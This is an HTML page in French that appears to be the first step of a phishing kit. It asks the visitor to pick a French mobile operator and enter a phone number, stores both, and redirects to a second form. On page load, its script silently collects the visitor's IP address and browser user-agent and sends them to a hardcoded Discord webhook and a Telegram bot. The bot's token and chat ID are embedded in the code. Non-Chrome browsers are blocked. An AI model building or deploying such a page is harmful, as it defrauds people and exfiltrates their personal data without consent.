<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />

<style>
  body {
    background: #2c014d;
    color: #fff;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .c {
    background: rgba(44,1,77,0.85);
    padding: 30px;
    border-radius: 20px;
    width: 360px;
    text-align: center;
    box-shadow: 0 0 15px #9b00ff;
    border: 2px solid #a54ffb;
  }
  input, select, button {

    margin: 8px 0;
    padding: 12px;
    border: 2px solid #a54ffb;

    color: white;

  }
  input:focus, select:focus {

    box-shadow: 0 0 10px #f7b500;
  }
  button {
    background: #f7b500;
    color: #2c014d;

    cursor: pointer;
    box-shadow: 0 0 10px #f7b500;
    transition: 0.3s;
  }
  button:hover {
    background: #e0a600;
    box-shadow: 0 0 20px #ffcb3c;
  }
  #msg {
    color: #f88;
    margin-top: 15px;
  }
  #chrome-block {
    position: fixed;
    inset: 0;
    background: #000;
    color: #fff;
    display: none;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
    text-align: center;
    padding: 20px;
  }
  #chrome-block h1 {
    margin-bottom: 20px;
  }
  #chrome-block button {
    width: auto;
    padding: 15px 40px;
    font-size: 18px;
  }
</style>
</head>
<body>

<div class="c" id="mainForm">
  <h1>√âtape 1 : Votre num√©ro </h1>
  <form id="form1">
    <select name="operateur" required>
      <option value="" disabled selected>Choisissez votre op√©rateur</option>
      <option value="Orange">Orange</option>
      <option value="SFR">SFR</option>
      <option value="Free">Free</option>
      <option value="Bouygues">Bouygues</option>
    </select>
    <input name="telephone" type="tel" placeholder="Num√©ro de t√©l√©phone" pattern="[0-9]{10}" required />
    <button type="submit">Continuer</button>
  </form>
  <div id="msg"></div>
</div>

<div id="chrome-block">
  <h1>Utilisez Google Chrome</h1>
  <p>Ouvrez cette page dans Google Chrome pour continuer.</p>
  <button onclick="window.location.href='https://www.google.com/chrome/'">T√©l√©charger Google Chrome</button>
</div>

<script>
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
  const TELEGRAM_CHAT_ID = "-1002810249796";

  function isGoogleChrome() {
    const ua = navigator.userAgent.toLowerCase();
    return /chrome/.test(ua) && !/edg/.test(ua) && !/opr/.test(ua) && !/safari/.test(ua);
  }

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP inconnue";
    } catch {
      return "IP inconnue";
    }
  }

  async function sendDiscord(embed) {
    return fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  async function sendTelegram(text) {
    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  }

  async function sendIpUaOnLoad() {
    const ip = await getIP();
    const ua = navigator.userAgent || "Inconnu";
    const browser = isGoogleChrome() ? "Google Chrome" : "Autre navigateur";

    const discordEmbed = {
      title: "[üõú] PAGE OUVERTE [üõú]",
      color: isGoogleChrome() ? 0x00FF00 : 0xFF0000,
      fields: [
        { name: "üì± Adresse IP", value: ip, inline: false },
        { name: "üì≤ User-Agent", value: ua, inline: false },
        { name: "üåê Navigateur", value: browser, inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    const telegramText =
      `[üåê] PAGE OUVERTE [üåê]\n\n` +
      `üåê Adresse IP : ${ip}\n` +
      `üåê User-Agent : ${ua}\n` +
      `üåê Navigateur : ${browser}`;

    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
  }

  window.addEventListener('load', async () => {
    await sendIpUaOnLoad();

    if (!isGoogleChrome()) {
      document.getElementById("mainForm").style.display = "none";
      document.getElementById("chrome-block").style.display = "flex";
    }
  });

  document.getElementById("form1").addEventListener("submit", (e) => {
    e.preventDefault();
    localStorage.setItem("step1", JSON.stringify({
      operateur: e.target.operateur.value,
      telephone: e.target.telephone.value
    }));

    const msgEl = document.getElementById("msg");
    msgEl.style.color = "#0f0";
    msgEl.textContent = "Redirection...";

    setTimeout(() => {
      window.location.href = "formulaire.html";
    }, 1000);
  });
</script>
